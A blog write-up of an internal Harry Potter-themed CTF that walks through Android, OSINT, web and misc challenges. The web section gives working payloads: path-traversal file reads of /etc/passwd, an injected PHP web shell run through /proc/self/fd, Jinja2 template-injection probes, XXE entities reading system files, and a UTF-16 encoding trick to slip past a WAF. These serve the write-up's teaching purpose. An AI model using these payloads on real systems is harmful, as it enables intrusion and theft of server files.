---
layout:     post
title:      Cyber-Gym 4.0 CTF Writeup
date:       2020-01-20
summary:    Detailed writeup of Internal CTF 
categories: CTF Writeup
tags: [CTF Write-up, Cyber-Gym]
---

<p align="center">
  <img src="/images/cybergym2/logo.png">
</p>

Hello Everyone 

i am back with a another CTF blog , this time some of my collegues created the challenges and hosted the CTF internally,

<p align="center">The CTF challenge is based on <strong>Harry Potter</strong> theme </p>

<p align="center">
  <img src="https://media.giphy.com/media/mz1kJeDVueKC4/giphy.gif">
</p>

The CTF format was in jeopardy. which has all type of challenges such as **Web, Mobile, Network , OSINT , Cloud, Misc, Programming**.

Rules for the CTF are quite simple. **No automated scripts allowed** which creates heavy traffic.

<p align="center">
  <img src="https://media.giphy.com/media/2kRm4LlDGGQlIpzkNk/giphy.gif">
</p>

Note : “The more you solve the points of the challenges get decrease due to the dynamic pointing system”

<p align="center">
  <strong>Android Challenges</strong>
</p>

Challenge Name : **Ronproject**

**Step 1 :** Download the APK and install into any Android Device or Emulator to check the Application UI and Functionality.

Note : Installation steps as shown below

<p align="center">
  <img src="/images/cybergym4/android1.png">
</p>

<p align="center">
  <img src="/images/cybergym4/android-2.png">
</p>

**Step 2 :**  By checking the capture image option on the Android Application , found that it scans for QR code as shown in the image below .

<p align="center">
  <img src="/images/cybergym4/android3.png">
</p>

**Step 3 :** After that i started looking for images on all the directory that is present in the application and found a intresting directory as shown below.

<p align="center">
  <img src="/images/cybergym4/android7.png">
</p>

**Step 4 :** Opening the code image shows it is broken.

<p align="center">
  <img src="/images/cybergym4/android8.png">
</p>

**Step 5 :** Then checking the format found it is **PNG** and tried to fix the corrupted magic number of the Image using the following command

```bash
hexeditor code.png
```

<p align="center">
  <img src="/images/cybergym4/android9.png">
</p>

**Magic Number of PNG** - 89 50 4E 47

<p align="center">
  <img src="/images/cybergym4/android10.png">
</p>

**Step 6 :** Open the image now , you will see the `QR Code`

<p align="center">
  <img src="/images/cybergym4/android11.png">
</p>

**Step 7 :** Scan the `QR Code`and you will get some **Secret Key** __Y0usc@nn3dth3k3y__ , but the real twist is this is not the flag !!!

<p align="center">
  <img src="/images/cybergym4/android12.png">
</p>

**Step 8 :** Went back to the Android Application and click on **WingaduimLeviosa** and we got this below error message.

<p align="center">
  <img src="/images/cybergym4/android13.png">
</p>

Note : From the above error message found that this application has some strings that are Encrypted 

**Step 9 :** Now Let's start the Static Analysis using **Apktool** using the following command

```bash
apktool d Ronproject.apk
```

<p align="center">
  <img src="/images/cybergym4/android4.png">
</p>

**Step 10 :** After that move into the **Ronproject** directory and check the **AndroidManifest.xml** file , found that it is a `Flutter Application` .

<p align="center">
  <img src="/images/cybergym4/android5.png">
</p>

**Step 11 :** Did a quick Google Search "How to decompile Flutter apk** and endup with this Link <https://stackoverflow.com/questions/53666487/flutter-debug-apk-decompile-to-get-source-code>

<p align="center">
  <img src="/images/cybergym4/android6.png">
</p>

**Step 12 :** So after going through the stackoverflow , understood that in each and every flutter application there will be `kernel_blob.bin` file which has the decompiled code of the application.

```bash
strings kernel_blob.bin > extracted_code.dart
```

<p align="center">
  <img src="/images/cybergym4/android14.png">
</p>

**Step 13 :** Open the extracted code file with any Text Editor as shown below and search for the keywords such as **Hermione** which was mentioned in the Android Application screen

<p align="center">
  <img src="/images/cybergym4/android15.png">
</p>

**Step 14 :** Now decrypt the encrypted text that we got from the extracted code and we get the flag.

`nTLxYPo5EESJTmMi/HgZ7Ip8pPGKYcEUxXMFX7I5lRQ=`

**Step 15 :** After google came across this website for Decrpyting **AES-ECB-MODE** <https://8gwifi.org/CipherFunctions.jsp> .

<p align="center">
  <img src="/images/cybergym4/android16.png">
</p>

<p align="center">
  <strong>Flag</strong>: cygym{R0n_S0uld_l3arn_Hybrid}
</p>

<p align="center">
  <strong>OSINT Challenges</strong>
</p>

Challenge Name : **Cybergym Email Server**

<p align="center">
  <img src="/images/cybergym4/osint1.png">
</p>

**Step 1 :** Let’s check the spam box , from where received the credentials.

<p align="center">
  <img src="/images/cybergym4/osint2.png">
</p>

**Step 2 :** Right click and choose the show original option.

<p align="center">
  <img src="/images/cybergym4/osint3.png">
</p>

**Step 3 :** After analyzing the original message , I found there is a keyword cygym in the message.

<p align="center">
  <img src="/images/cybergym4/osint4.png">
</p>

**Step 4 :** After that we started checked the dmarc record of the main domain lucideus.in using DMARC check tool.

<p align="center">
  <img src="/images/cybergym4/osint5.png">
</p>

**Step 5 :** That's how we found the second part of the flag. 

<p align="center">
  <strong>Flag</strong>: cygym{L3ts_pr3v3nt__phishing}
</p>

Challenge Name : **Magic Traces**

**Step 1 :** The challenge was given with a  **PPT file** , it had around **5 Pages**.

**Step 2 :** The First page had some username as **Hogwart64223275** on the Top Right Corner as shown below.

<p align="center">
  <img src="/images/cybergym4/osint6.png">
</p>

**Step 3 :** So i started searching on internet and found this username on twitter.

<p align="center">
  <img src="/images/cybergym4/osint7.png">
</p>

**Step 4 :** Going further on the tweets from the account <https://twitter.com/Hogwart64223275/status/1334917663101919237/photo/1>, i noticed one of the QR code in it.

<p align="center">
  <img src="/images/cybergym4/osint8.png">
</p>

**Step 5 :** Scanning the QR code took me to a anonymousfile.io <https://anonymousfiles.io/w04vI6Zj/> sharing website.

<p align="center">
  <img src="/images/cybergym4/osint9.png">
</p>

**Step 6 :** It had a image in it download the image from the website.

<p align="center">
  <img src="/images/cybergym4/osint13.png">
</p>

**Step 7 :** From the second page there was keyword in italic format *mnemonic* so i started searching for **Mnemonic Encryption**.

<p align="center">
  <img src="/images/cybergym4/osint10.png">
</p>

**Step 8 :** Found a github repository for [Mnemonic Encryption & Decryption](https://github.com/MustafaTanguner/Mnemonic) with the same background which was on the **Hogwart64223275** Twitter account.

<p align="center">
  <img src="/images/cybergym4/osint11.png">
</p>

<p align="center">
  <img src="/images/cybergym4/osint12.png">
</p>

**Step 9 :** Now Let's move to the third page , it had some **Base64** string encoded.

<p align="center">
  <img src="/images/cybergym4/osint13.png">
</p>

**Step 10 :** Decrypted the **Base64** algorithm using this website <https://www.base64decode.org/>.

<p align="center">
  <img src="/images/cybergym4/osint14.png">
</p>

**Step 11 :** We got a another **anonymousfile.io** shareable link <https://anonymousfiles.io/bai39RHM/> , Download the file.

<p align="center">
  <img src="/images/cybergym4/osint15.png">
</p>

**Step 12 :** Now we can run **Mnemonic Encryption & Decryption**  tool and get the secret text out as shown below.

<p align="center">
  <img src="/images/cybergym4/osint16.png">
</p>

**Step 13 :** The decrypted text has a username `_harry_wizardry_telling` , found this username on one of the instagram account.

<p align="center">
  <img src="/images/cybergym4/osint17.png">
</p>

**Step 14 :** There was a sound cloud account on the **Instagram Bio** <https://soundcloud.com/harry-rom-215683629> .

<p align="center">
  <img src="/images/cybergym4/osint18.png">
</p>

**Step 15 :** Upon opening the soundcloud account it redirected to <https://soundcloud.com/harry-rom-215683629>, there was nothing inside in it.

<p align="center">
  <img src="/images/cybergym4/osint19.png">
</p>

**Step 16 :** So i tried to login into the soundcloud account using the username **harry-rom-215683629** and password is **Scotland-UK** taken from the instagram post Location which had some hint **"location is the key"** as shown below.

<p align="center">
  <img src="/images/cybergym4/osint20.png">
</p>

<p align="center">
  <img src="/images/cybergym4/osint21.png">
</p>

**Step 17 :** We were able to successfully log-in , after that found that there is video which was kept in **private**.

<p align="center">
  <img src="/images/cybergym4/osint22.png">
</p>

**Step 18 :** Looking closely on the video title , there was a another hint **Hearmewitheyes** .

<p align="center">
  <img src="/images/cybergym4/osint23.png">
</p>

**Step 19 :** So i started downloading the file from soundcloud.

**Step 20 :** Open **Sonic Visualizer** and Choose **Layer** -> **Add Spectogram** -> **All Channels Mixed** and we were able to see the flag.

<p align="center">
  <img src="/images/cybergym4/osint24.png">
</p>

<p align="center">
  <strong>Flag</strong>: cygym{Harry_MasterOS1NT}
</p>

<p align="center">
  <strong>Web Challenges</strong>
</p>

Challenge Name : **Norris**

<p align="center">
  <img src="/images/cybergym4/web1.png">
</p>

**Step 1 :** Open the first challenge URL <http://norris.cybergym.lucideus.in/>

<p align="center">
  <img src="/images/cybergym4/web2.png">
</p>

**Step 2 :** From the image , I was able to observe that there is a cat in it and there is a character in Harry Potter Movie called **Norris** .so started checking on the next challenge URL.

<p align="center">
  <img src="/images/cybergym4/web3.png">
</p>

**Step 3 :** The page is not working , but there is a port number 8009 in the second challenge URL , so i started searching on google with the keyword “cat 8009”.

<p align="center">
  <img src="/images/cybergym4/web4.png">
</p>

**Step 4 :** After this I started searching for an exploit POC through googling endup with this medium article 
[Ghostcat vulnerability | CVE-2020–1938 | AJP LFI | Apache Tomcat Server vulnerability](https://medium.com/@prem2/ghostcat-vulnerability-cve-2020-1938-ajp-lfi-apache-tomcat-server-vulnerability-9f57330e3eb1)
 
**Step 5 :** Using this Exploit from github [ZhengHaoCHeng/CNVD-2020-10487: CVE-2020-1938 / CNVD-2020-1048 Detection Tools](https://github.com/ZhengHaoCHeng/CNVD-2020-10487) , i was able to get the flag with the following command.

<p align="center">
  <img src="/images/cybergym4/web5.png">
</p>

<p align="center">
  <strong>Flag</strong>: cygym{Norris_a_Maine_Coon_cat}
</p>

Challenge Name : **Magic Online**

<p align="center">
  <img src="/images/cybergym4/web6.png">
</p>

**Step 1 :** Open the challenge URL <http://magic-online.cybergym.lucideus.in/>.

<p align="center">
  <img src="/images/cybergym4/web7.png">
</p>

**Step 2 :** After trying to reach any of the pages endup with the following message.

<p align="center">
  <strong>Can you get to /hogwart!!!</strong>
</p>

<p align="center">
  <img src="/images/cybergym4/web8.png">
</p>

**Step 3 :** Tried appending hogwart at the end of the page and got a different page.

<p align="center">
  <img src="/images/cybergym4/web9.png">
</p>

**Step 4 :** Found that the application is using Flask , again i started googling for Flask Based Vulnerability and endup on **“SSTI on Jinja2Flask”**.

**Step 5 :** Started testing for normal SSTi Payloads {{7*7}}.

<p align="center">
  <img src="/images/cybergym4/web10.png">
</p>

**Step 6:** Now we need to check few other things like blacklist = ['config', 'self'], then i started to search on internet and found a way to get the current_app name wit the following command.

<p align="center">
  <strong>{{get_flashed_messages.__globals__}}</strong>
</p>

<p align="center">
  <img src="/images/cybergym4/web11.png">
</p>

**Step 7 :** As the challenge description say we need to invoke the config file , so that we can read the flag , tried the following command but the response is 200 and no flag.

<p align="center">
  <img src="/images/cybergym4/web15.png">
</p>

<p align="center">
  <img src="/images/cybergym4/web12.png">
</p>

**Step 8 :**  So i tired manipulating the config keyword in the request and endup with a different response.

<p align="center">
  <img src="/images/cybergym4/web13.png">
</p>

**Step 9 :** It can be seen that we need a spell name so that the flag can be invoked with it, so I started googling for [12 Most Popular Magic Spells of Harry Potter](https://collegedunia.com/social/254-potterheads-if-you-know-what-all-these-magic-spells-mean-your-letter-to-hogwarts-is-on-its-way) and after trying a few spells found the correct one.

<p align="center">
  <img src="/images/cybergym4/web16.png">
</p>

<p align="center">
  <img src="/images/cybergym4/web14.png">
</p>

<p align="center">
  <strong>Flag</strong>: cygym{Do_not_let_the_muggles_get_you_down}
</p>

Challenge Name : **Hogwart Book**

**Step 1:** Open the challenge URL <http://hogwart-book.cybergym.lucideus.in> ,Enter any random string and click on submit.

<p align="center">
  <img src="/images/cybergym4/web17.png">
</p>

**Step 2:** It will show two .txt file , click on any of the files.

<p align="center">
  <img src="/images/cybergym4/web18.png">
</p>

**Step 3:** There is parameter called **file=** , so i started testing for **Local File Inclusion**.

<p align="center">
  <img src="/images/cybergym4/web19.png">
</p>

**Step 4:** Using the following payload , was able to read `/etc/passwd`.

<p align="center">
  <strong>file=../../../../../../../etc/passwd</strong>
 </p>

<p align="center">
  <img src="/images/cybergym4/web23.png">
</p>



**Step 4:** After Observing some the traffic of the application using Burpsuite , found a **POST** request is sent to the server with the parameter **book_name**.

<p align="center">
  <img src="/images/cybergym4/web20.png">
</p>


**Step 5:** After play with the **POST** request found that we can send a malicous `PHP` shell command to the server as follow.

```php
<?php echo system($_GET["cmd"]); ?>
```

<p align="center">
  <img src="/images/cybergym4/web21.png">
</p>

**Step 6:**  Now using the following command we will be able to do a directory listing on the server. 

`http://hogwart-book.cybergym.lucideus.in/index.php?cmd=ls%20/&file=../../../../../proc/self/fd/9`

Note: /proc/self/fd is part of a larger scheme that exposes the **file descriptor** of all processes.

<p align="center">
  <img src="/images/cybergym4/web23.png">
</p>

**Step 7:** From the above image it is observed that there is a directory called `flag_is_here`.

**Step 8:** Navigate to the following directory using the following payload.

`http://hogwart-book.cybergym.lucideus.in/index.php?cmd=ls%20/flag_is_here&file=../../../../../proc/self/fd/9`

<p align="center">
  <img src="/images/cybergym4/web24.png">
</p>

**Step 9:** Looking into the **flag.txt** file , we found there is a directory called `\hogwart-access-log\`.

<p align="center">
  <img src="/images/cybergym4/web25.png">
</p>

**Step 10:** Lets look into the `\hogwart-access-log\`  see what is inside it.

`http://hogwart-book.cybergym.lucideus.in/hogwart-access-log/`

<p align="center">
  <img src="/images/cybergym4/web26.png">
</p>

**Step 10:** Open the **final.log** file as shown below.

<p align="center">
  <img src="/images/cybergym4/web27.png">
</p>

**Step 11:** We can see that there is **String.fromCharCode**. 

<p align="center">
  <img src="/images/cybergym4/web28.png">
</p>

**Step 12:** Decrypt the encoded **String.fromCharCode** using Burpsuite decoder, you can use smart decode.

<p align="center">
  <img src="/images/cybergym4/web29.png">
</p>

**Step 13:** Copy the Decrypted **String.fromCharCode** , we need to covert this to readble **plain text**.

Note : Using this website we can covert it <https://charcode98.neocities.org/>

<p align="center">
  <img src="/images/cybergym4/web30.png">
</p>

**Step 14:** From  the above image , it can be seen that we have got a another domain called <http://hogwart-library.cybergym.lucideus.in>

<p align="center">
  <img src="/images/cybergym4/web31.png">
</p>

**Step 15:** After going this New Domain found a upload section , with a **sample.xml** file given for uploading.

<p align="center">
  <img src="/images/cybergym4/web32.png">
</p>

**Step 16:** Open the **sample.xml** file.

<p align="center">
  <img src="/images/cybergym4/web33.png">
</p>

**Step 17:** Upload the **sample.xml** and observe the response from the server , as shown below.

<p align="center">
  <img src="/images/cybergym4/web34.png">
</p>

**Step 18:** Since the input is given in `XML` , so i tried to test for **XXE** related vulnerabilites and found that **WAF Blocks!!!** the malicious payload given in the file.

```xml
<?xml version='1.0'?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<users>
    <user>
        <username>Harry</username>
        <password>passwd1</password>
        <name>Harry</name>
        <email>harry@hogwart.com</email>  
	<group>&test;</group>
    </user>
    <user>
        <username>Hermione</username>
        <password>passwd2</password>
        <name> Hermione</name>
        <email>hermione@hogwart.com</email>  
        <group>CYGYM2020</group>
    </user>
</users>
```

<p align="center">
  <img src="/images/cybergym4/web35.png">
</p>

**Step 19:** So we have to bypass the **WAF** , so i tried to change the format of the UTF from **UTF-8** to **UTF-16BE** using the following command

`cat sample.xml | iconv -f UTF-8 -t UTF-16BE > payload.xml`

<p align="center">
  <img src="/images/cybergym4/web36.png">
</p>

**Step 20:** Now we get the partial output of the `/etc/passwd`.

<p align="center">
  <img src="/images/cybergym4/web37.png">
</p>

**Step 21:** From the user page found that we need to supply **intro** filed which was missing in our payload .

<p align="center">
  <img src="/images/cybergym4/web38.png">
</p>

**Step 22:** Final payload looks as shown below.

```xml
<?xml version='1.0'?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<users>
    <user>
        <username>Harry</username>
        <password>passwd1</password>
        <name>Harry</name>
        <email>harry@hogwart.com</email>  
	<group>&test;</group>
        <intro>&test;</intro>
    </user>
    <user>
        <username>Hermione</username>
        <password>passwd2</password>
        <name> Hermione</name>
        <email>hermione@hogwart.com</email>  
        <group>CYGYM2020</group>
    </user>
</users>
```

<p align="center">
  <img src="/images/cybergym4/web39.png">
</p>

**Step 23:** We got the flag location from the about page as shown below.

<p align="center">
  <img src="/images/cybergym4/web40.png">
</p>

**Step 24:** So the final paylaod to get the **Flag** is given below.

```xml
<?xml version='1.0'?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/flag'>]>
<users>
    <user>
        <username>Harry</username>
        <password>passwd1</password>
        <name>Harry</name>
        <email>harry@hogwart.com</email>  
        <group>&test;</group>
        <intro>&test;</intro>
    </user>
    <user>
        <username>Hermione</username>
        <password>passwd2</password>
        <name> Hermione</name>
        <email>hermione@hogwart.com</email>  
        <group>CYGYM2020</group>
    </user>
</users>
```
<p align="center">
  <img src="/images/cybergym4/web41.png">
</p>

<p align="center">
  <strong>Flag</strong>: cygym{Horcrux:Secrets of the Darkest Art} 
</p>

<p align="center">
  <strong>Misc</strong>
</p>

Challenge Name : **Dark Magic**

<p align="center">
  <img src="/images/cybergym4/misc1.png">
</p>

**Step 1 :** Open the challenge URL , it a Github Profile with a repository [https://github.com/HariRiddle].

**Step 2 :** From the challenge description was able to understand that the visually challenged  uses Braille Code for reading the text.

**Step 3 :** Looking into the repository , found a weird commit history table. 

<p align="center">
  <img src="/images/cybergym4/misc2.png">
</p>

**Step 4 :** Through googling found a script to make it in a readable format. [its-sarin/BrailleCodec](https://github.com/its-sarin/BrailleCodec): A small python script to encode plain text to Braille or decode Braille to plain text.

**Step 5 :** After checking the source code i crafted the Braille code to give it as a input. 

<p align="center">
  <strong>⠼⠍⠇⠁⠊⠝⠙⠊⠉</strong>
</p>

**Step 6 :** Using the following command was able to convert the braille code to text format. 

<p align="center">
  <img src="/images/cybergym4/misc3.png">
</p>

<p align="center">
  <strong>Flag</strong>: cygym{mlaindic}
</p>
